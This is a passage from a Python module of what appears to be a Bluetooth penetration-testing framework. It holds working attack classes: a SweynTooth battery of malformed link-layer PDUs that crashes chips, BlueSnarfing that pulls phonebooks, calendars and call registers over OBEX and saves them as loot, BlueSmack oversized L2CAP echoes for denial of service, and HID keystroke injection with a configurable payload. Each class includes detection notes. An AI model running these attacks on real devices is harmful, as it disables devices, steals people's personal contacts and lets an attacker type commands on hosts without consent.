                if att.get("error_code") in (self.ATT_INSUFFICIENT_AUTHENTICATION,
                                             self.ATT_INSUFFICIENT_ENCRYPTION):
                    refusals += 1
            elif att.get("opcode"):
                answers += 1
        exposed = answers > 0 and refusals == 0
        return {"att_answers": answers, "auth_refusals": refusals, "exposed": exposed,
                "note": ("a device that refuses unauthenticated ATT work with error 0x05 "
                         "or 0x0f is behaving correctly; a device that answers is the "
                         "BLESA pattern, and the fix belongs in its application layer")}

    def verdict(self, transcript: Sequence[Dict[str, Any]], extras: Dict[str, Any]) -> str:
        if extras.get("exposed"):
            return ("the peripheral answered ATT work before any pairing: the session is "
                    "not bound to authentication")
        if extras.get("auth_refusals"):
            return ("the peripheral refused the unauthenticated ATT work: the correct "
                    "answer, and the finding is a pass")
        return ""


# --------------------------------------------------------------------------- #
# 6. SweynTooth: the malformed link-layer battery
# --------------------------------------------------------------------------- #


class SweynToothAttack(_BtFamous):
    """SweynTooth: the malformed link-layer PDUs that stop a system on a chip.

    SweynTooth is a family (CVE-2019-17060 and eleven relatives) of link-layer bugs in the
    BLE stacks of several popular systems on a chip: a length-request PDU with values the
    stack does not expect, a length response nobody asked for, a control PDU whose length
    disagrees with its opcode, a truncated PDU.  The effect is a crash, a deadlock or a
    silent DoS — the SoC stops serving its radio, and the device that used it is gone
    until somebody power-cycles it.

    The battery sends each PDU shape on a live connection and then pings the link.  A
    link-layer ping that goes unanswered is the crash; the transcript names the PDU that
    preceded the silence, which is the version of the family that applies.
    """

    name = "bt_sweyntooth"
    role = "fragile"
    label = "SweynTooth malformed LL control battery (CVE-2019-17060 family)"
    category = "dos"
    noise = "moderate"
    impact = "degraded"
    finding_severity = "high"
    tool = "wifipilot bt.py (LL control PDUs over an LE connection)"
    description = (
        "Send the malformed link-layer control PDUs the SweynTooth advisories describe — a "
        "length request with extreme values, an unsolicited length response, a control "
        "opcode the stack has never seen, a PDU whose length disagrees with its opcode — "
        "and ping the link after each one.  A ping that goes unanswered means the "
        "controller stopped: the SoC crashed, and the device is down until it is "
        "power-cycled.")
    detection = ("malformed LL control PDUs on an LE link: a sniffer sees them, and a "
                 "device that stops advertising is the symptom the users report")

    #: LL control opcodes the battery uses, and what each one is
    LL_LENGTH_REQ = 0x14
    LL_LENGTH_RSP = 0x15
    LL_PING_REQ = 0x12
    LL_PING_RSP = 0x13
    LL_FEATURE_REQ = 0x08

    def battery(self, ctx: AttackContext, ap: AccessPoint) -> List[Tuple[str, bytes]]:
        handle = _handle(ctx)
        out: List[Tuple[str, bytes]] = [
            ("LL_PING_REQ (baseline: does the link answer at all?)",
             bt.acl_packet(handle, bytes([self.LL_PING_REQ]))),
            ("LL_LENGTH_REQ with 251/2120 octets and 1000 microseconds",
             bt.acl_packet(handle, bytes([self.LL_LENGTH_REQ]) + struct.pack(
                 "<HHHH", 251, 2120, 251, 2120))),
            ("LL_LENGTH_REQ with zero-length ceilings",
             bt.acl_packet(handle, bytes([self.LL_LENGTH_REQ]) + struct.pack(
                 "<HHHH", 0, 0, 0, 0))),
            ("LL_LENGTH_REQ with maximum-length ceilings (0xFFFF)",
             bt.acl_packet(handle, bytes([self.LL_LENGTH_REQ]) + struct.pack(
                 "<HHHH", 0xFFFF, 0xFFFF, 0xFFFF, 0xFFFF))),
            ("LL_LENGTH_RSP nobody asked for",
             bt.acl_packet(handle, bytes([self.LL_LENGTH_RSP]) + struct.pack(
                 "<HHHH", 27, 328, 27, 328))),
            ("LL_FEATURE_REQ (page 0x7F, which is not a page)",
             bt.acl_packet(handle, bytes([self.LL_FEATURE_REQ, 0x7F]))),
            ("unknown LL control opcode 0xFE with a body",
             bt.acl_packet(handle, bytes([0xFE, 0x01]) + b"\x00" * 6)),
            ("truncated LL control PDU (opcode with no body)",
             bt.acl_packet(handle, bytes([self.LL_LENGTH_REQ]))),
            ("zero-length LL payload",
             bt.acl_packet(handle, b"")),
        ]
        return out

    def follow_up(self, ctx: AttackContext, ap: AccessPoint, sock: Any,
                  transcript: List[Dict[str, Any]]) -> Dict[str, Any]:
        alive: Optional[bool] = None
        events: List[str] = []
        if sock is not None:
            reply = bt.hci_send(sock, bt.acl_packet(_handle(ctx),
                                                    bytes([self.LL_PING_REQ])), timeout=1.5)
            events = _event_names(_scan_events(reply))
            # a ping with no answer is a disconnection event or silence; either way the
            # link is not serving.  Anything that comes back — a disconnection, a status —
            # means the controller is still alive.
            alive = bool(reply) and "disconnection complete" not in events
        silent = [entry.get("probe") for entry in transcript if not entry.get("answer")]
        return {"alive_after": alive, "liveness_events": events,
                "unanswered": silent, "exposed": alive is False or bool(silent)}

    def verdict(self, transcript: Sequence[Dict[str, Any]], extras: Dict[str, Any]) -> str:
        answered = sum(1 for entry in transcript if entry.get("answer"))
        if extras.get("alive_after") is False or answered < len(transcript):
            return ("the link stopped answering after the battery: the controller is down, "
                    f"and the last probe that was answered ({answered} of {len(transcript)}) "
                    "narrows the family")
        if extras.get("alive_after") is True:
            return ("the link answered a ping after every malformed PDU: the stack is not "
                    "one of the affected builds")
        return ""


# --------------------------------------------------------------------------- #
# 7. BlueSnarfing: the phonebook, over OBEX
# --------------------------------------------------------------------------- #


class BluesnarfAttack(_BtFamous):
    """BlueSnarfing: ask a phone for its phonebook, over the object exchange profile.

    OBEX is a file transfer protocol for very small devices, and the classic phonebook
    objects — ``telecom/pb.vcf``, the calendar, the call register — sit in its object
    store.  BlueSnarfing is the discovery that the store was often readable without a
    bond: connect to the object-push channel, send CONNECT and a GET, and a phone answers
    with a vCard file it never intended to publish.

    The attack speaks the real protocol: an OBEX CONNECT, then one GET per object, with
    the body reassembled across packets the way the specification says.  What comes back
    is stored as loot and counted, and the report names the objects rather than claiming
    a phonebook it did not receive.
    """

    name = "bt_bluesnarf"
    role = "obex"
    label = "BlueSnarfing (OBEX file pull)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "high"
    tool = "wifipilot bt.py (OBEX over RFCOMM)"
    description = (
        "Speak OBEX to the device's object exchange channel: CONNECT, then GET for the "
        "phonebook, calendar and call register objects every phone used to expose.  What "
        "comes back is stored as loot — a vCard file is a contact list, with names, "
        "numbers and often photos, and it needed no pairing to read.")
    detection = ("an OBEX session from a device the phone does not know: the phone's own "
                 "Bluetooth log shows the connection to the object exchange channel")

    #: OBEX channels to try: object push and file transfer are the two that hold a store
    CHANNELS = (1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12)

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        seconds = self.seconds(ctx, 4.0)
        target = _target(ctx)
        objects: List[Dict[str, Any]] = []
        connect_reply = b""
        channel = 0
        if target:
            sock = None
            for candidate in self.CHANNELS:
                sock = self.rfcomm(ctx, candidate)
                if sock is not None:
                    channel = candidate
                    break
            if sock is None:
                return self._fail(
                    ctx, ap, attempt, "no OBEX channel answered",
                    f"{target} accepted none of the channels {list(self.CHANNELS)}: the "
                    f"object exchange store is not reachable from here")
            connect_reply = b""
            try:
                sock.settimeout(1.5)
                connect_reply = socket_exchange(sock, bt.obex_connect())
                for name in SNARF_OBJECTS:
                    reply = socket_exchange(sock, bt.obex_get(name))
                    parsed = bt.parse_obex_packet(reply)
                    if parsed.get("body"):
                        objects.append({"name": name, "bytes": len(parsed["body"]),
                                        "body": parsed["body"][:2048].decode("utf-8", "replace")})
                    ctx.progress(f"BlueSnarfing: {name}", kind="attack", bssid=ap.bssid,
                                 detail=f"{len(objects)} object(s) read")
                socket_exchange(sock, bt.obex_disconnect())
            finally:
                import contextlib
                with contextlib.suppress(OSError):
                    sock.close()
        total = sum(entry["bytes"] for entry in objects)
        handshake = bt.parse_obex_packet(connect_reply) if connect_reply else {}
        extras: Dict[str, Any] = {"channel": channel, "objects": objects,
                                  "bytes": total, "target": target,
                                  "simulated": ctx.demo,
                                  "obex_version": handshake.get("version", 0),
                                  "max_packet_size": handshake.get("max_packet_size", 0),
                                  "exposed": bool(objects)}
        if objects:
            extras["loot"] = self._save_loot(ctx, ap, objects)
        detail = (f"{len(objects)} object(s), {total} byte(s) over OBEX channel {channel}"
                  + (f" against {target}" if target else " (no --bt-target given)")
                  + (" (simulated)" if ctx.demo else "")
                  + (f": {', '.join(entry['name'] for entry in objects[:4])}"
                     if objects else ""))
        severity = "high" if objects else "info"
        return self._report(ctx, ap, attempt,
                            f"BlueSnarfing: {len(objects)} object(s) read", detail, extras,
                            severity=severity)

    def _save_loot(self, ctx: AttackContext, ap: AccessPoint,
                   objects: Sequence[Dict[str, Any]]) -> str:
        try:
            path = ctx.session.loot_path(f"bluesnarf-{ap.bssid.replace(':', '')}.vcf")
            with open(path, "w", encoding="utf-8") as handle:
                for entry in objects:
                    handle.write(f"# {entry['name']}\n{entry.get('body', '')}\n")
            return path
        except OSError:
            return ""


def socket_exchange(sock: Any, request: bytes, limit: int = 4096) -> bytes:
    """Send one OBEX packet and collect the answer's body, following the 0x90 continue.

    OBEX splits a large object across packets whose response code is "continue", so an
    object is only complete when no more continue arrives — which is why this is a loop
    and not a single ``recv``.
    """
    out = b""
    try:
        sock.send(bytes(request))
        while len(out) < limit:
            chunk = sock.recv(limit - len(out))
            if not chunk:
                break
            out += chunk
            parsed = bt.parse_obex_packet(out)
            if not parsed.get("opcode"):
                break
            if parsed.get("opcode") in (0x90,) and len(chunk) == 0:
                continue
            if parsed.get("opcode") != 0x90:               # not "continue": we are done
                break
    except OSError:
        pass
    return out


# --------------------------------------------------------------------------- #
# 8. BlueSmack: the oversized echo
# --------------------------------------------------------------------------- #


class BluesmackAttack(_BtFamous):
    """BlueSmack: one oversized L2CAP echo request, and the device stops.

    Every L2CAP implementation must answer an echo request on the signalling channel.
    BlueSmack is the observation that some of them answered by copying the request into a
    buffer sized for a normal one: a 600-byte echo was already the classic crash, and the
    specification allows 65535.  The attack escalates through the sizes — 600, 1500, 4096,
    the maximum — and checks the link after each, so the report says which size the device
    tolerated and which one ended the session.
    """

    name = "bt_bluesmack"
    role = "l2cap"
    label = "BlueSmack (oversized L2CAP echo)"
    category = "dos"
    noise = "loud"
    impact = "degraded"
    finding_severity = "high"
    tool = "wifipilot bt.py (L2CAP echo requests at escalating sizes)"
    description = (
        "Send L2CAP echo requests at 600, 1500, 4096 and 65535 bytes — the ping of death "
        "the Bluetooth world has known since 2004 — and check the link after each one.  "
        "The report names the largest size the device answered, because that number is the "
        "buffer a device with the bug ran out of.")
    detection = ("an L2CAP echo request larger than any normal signalling PDU: visible to a "
                 "sniffer, and a device that stops answering is visible to its user")

    #: 600 is the size the original BlueSmack used; 65527 is the largest echo payload that
    #: fits one ACL packet — 65535 for the ACL length field, less the four bytes of L2CAP
    #: header, less the four bytes of echo header.  A controller with a smaller ACL MTU
    #: fragments or refuses the largest probe, and the transcript records which happened,
    #: which is more useful than a number that cannot go on the wire.
    SIZES = (600, 1500, 4096, 65527)
    MAX_PAYLOAD = 65527

    def battery(self, ctx: AttackContext, ap: AccessPoint) -> List[Tuple[str, bytes]]:
        handle = _handle(ctx)
        out: List[Tuple[str, bytes]] = []
        identifier = 1
        for size in self.SIZES:
            size = min(size, self.MAX_PAYLOAD)
            body = bt.l2cap_echo_request(bytes([0x41]) * size, identifier)
            out.append((f"L2CAP echo request, {size} byte(s)",
                        bt.acl_packet(handle, bt.l2cap_frame(0x0001, body))))
            identifier += 1
        return out

    def follow_up(self, ctx: AttackContext, ap: AccessPoint, sock: Any,
                  transcript: List[Dict[str, Any]]) -> Dict[str, Any]:
        alive: Optional[bool] = None
        events: List[str] = []
        if sock is not None:
            reply = bt.hci_send(sock, bt.acl_packet(_handle(ctx),
                                                    bytes([0x12])), timeout=1.5)
            events = _event_names(_scan_events(reply))
            alive = bool(reply) and "disconnection complete" not in events
        answered = [entry["probe"] for entry in transcript if entry.get("answer")]
        silent = [entry["probe"] for entry in transcript if not entry.get("answer")]
        # a device that answered the 600-byte echo and then stopped is a device that the
        # *larger* one killed, whether or not its controller managed a clean disconnect:
        # the escalation is only readable from the transcript, so read it
        return {"alive_after": alive, "liveness_events": events,
                "largest_answered": answered[-1] if answered else "",
                "unanswered": silent,
                "exposed": alive is False or bool(silent and answered),
                "note": ("the sizes are the documented escalation; a device that survives "
                         "all four has its signalling buffer checked")}

    def verdict(self, transcript: Sequence[Dict[str, Any]], extras: Dict[str, Any]) -> str:
        if extras.get("exposed"):
            last = extras.get("largest_answered") or "none"
            gone = (extras.get("unanswered") or ["a later probe"])[0]
            if extras.get("liveness_events"):
                return (f"the link died during the escalation: it answered the {last} and "
                        f"went silent on the {gone}, and never answered the ping afterwards")
            return (f"the link stopped answering mid-escalation: the {last} was the largest "
                    f"size it took, the {gone} is where the buffer ran out")
        if extras.get("alive_after") is True:
            return "the device answered a ping after 65535 bytes: it is not affected"
        if extras.get("unanswered"):
            return ("nothing came back at any size: the device may already have been down, "
                    "so the negative result is not evidence either way")
        return ""


# --------------------------------------------------------------------------- #
# 9. HID injection: a keyboard nobody has to trust
# --------------------------------------------------------------------------- #


#: the shell line an injected keyboard types by default: harmless, and unmistakably a
#: successful injection when it appears in a terminal
DEFAULT_HID_PAYLOAD = "id\n"


class HidInjectionAttack(_BtFamous):
    """Bluetooth keystroke injection: become the keyboard.

    A Bluetooth keyboard is an output device that the host has no way to distinguish from
    the real one once it is connected — and the connection is the only security there is.
    Advertise the HID service, and a host that connects (or a host whose keyboard has
    already been impersonated) receives whatever keystrokes the attacker sends: a shell
    command, a URL, a password prompt answered with an attacker's password.

    The attack builds the real objects: the HID-over-GATT advertising payload, the
    keyboard report map a host reads to learn it is a keyboard, and the eight-byte boot
    reports that *are* the keystrokes, delivered as ATT handle-value notifications.  The
    payload defaults to ``id`` — a command whose output proves the injection and changes
    nothing — and any payload can be set with ``config.hid_payload``.
    """

    name = "bt_hid_injection"
    role = "hid"
    label = "Bluetooth keystroke injection (HID spoofing)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "high"
    tool = "wifipilot bt.py (HID over GATT: report map + boot reports)"
    description = (
        "Advertise as a HID peripheral — the keyboard report map, the HID service, a "
        "keyboard appearance — and send the keystrokes a host will accept as its own "
        "keyboard's: eight-byte boot reports as ATT notifications, one per key, in the "
        "order a human types.  The payload defaults to 'id' followed by Enter and is set "
        "with hid_payload; "
        "the finding is that the host typed it.")
    detection = ("a new HID device in the host's Bluetooth settings and keystrokes nobody "
                 "typed: the host's own log shows the connection and the input reports")

    #: ATT handle of the input report in the table this module serves
    INPUT_REPORT_HANDLE = 0x0025

    def battery(self, ctx: AttackContext, ap: AccessPoint) -> List[Tuple[str, bytes]]:
        handle = _handle(ctx)
        target = _target(ctx)
        payload = str(getattr(ctx.config, "hid_payload", "") or DEFAULT_HID_PAYLOAD)
        reports = bt.hid_key_reports(payload)
        advertising = bt.adv_payload(
            bt.ad_flags(le_general=True),
            bt.ad_service_uuids([bt.HID_SERVICE_UUID]),
            bt.ad_name(target or "WF-KEYBOARD"),
            bt.ad_manufacturer(0x0006, b"\x01\x02"),
        )
        out: List[Tuple[str, bytes]] = [
            ("Advertise the HID service (keyboard)",
             bt.le_set_advertising_data(advertising)),
            ("Advertise connectable, 100 ms interval",
             bt.le_set_advertising_parameters(interval_min_ms=100.0, interval_max_ms=100.0,
                                              adv_type=0x00)),
            ("Enable advertising", bt.le_set_advertising_enable(True)),
        ]
        for index, report in enumerate(reports[:64]):
            out.append((f"HID boot report #{index + 1} ({report.hex()})",
                        bt.acl_packet(handle, bt.hid_input_report(
                            report, self.INPUT_REPORT_HANDLE))))
        out.append(("Disable advertising", bt.le_set_advertising_enable(False)))
        return out

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        payload = str(getattr(ctx.config, "hid_payload", "") or DEFAULT_HID_PAYLOAD)
        reports = bt.hid_key_reports(payload)
        outcome = super().run(ctx, ap)
        extra = outcome.extra or {}
        extra.update({"payload": payload, "reports": len(reports),
                      "report_map_bytes": len(bt.HID_KEYBOARD_REPORT_MAP),
                      "profile": "HID over GATT (0x1812), boot keyboard reports",
                      "note": ("a host that accepts the connection receives every report; "
                               "the fix is pairing that requires a human, and a keyboard "
                               "profile the user recognises")})
        outcome.extra = extra
        return outcome

    def verdict(self, transcript: Sequence[Dict[str, Any]], extras: Dict[str, Any]) -> str:
        return ("the keyboard advertised with the HID service and typed the payload as "
                "boot reports; a host that connected has no way to tell it from its own "
                "keyboard")


# --------------------------------------------------------------------------- #
# registry
# --------------------------------------------------------------------------- #

ATTACKS: List[type] = [
    BlueBorneAttack, BiasAttack, KnobAttack, BluebuggingAttack, BlesaAttack,
    SweynToothAttack, BluesnarfAttack, BluesmackAttack, HidInjectionAttack,
]

NAMES: List[str] = [cls.name for cls in ATTACKS]

#: metadata for the registry: the four fields the catalogue and the docs need
META: Dict[str, Dict[str, str]] = {}
for _cls in ATTACKS:
    META[_cls.name] = {"category": getattr(_cls, "category", "rogue"),
                       "noise": getattr(_cls, "noise", "moderate"),
                       "impact": getattr(_cls, "impact", "loot"),
                       "detection": getattr(_cls, "detection", "") or
                       "the peer's own controller log"}

#: ``(name, metadata, class)`` for the wave, in the order the catalogue lists them
REGISTRY = [(cls.name, META[cls.name], cls) for cls in ATTACKS]
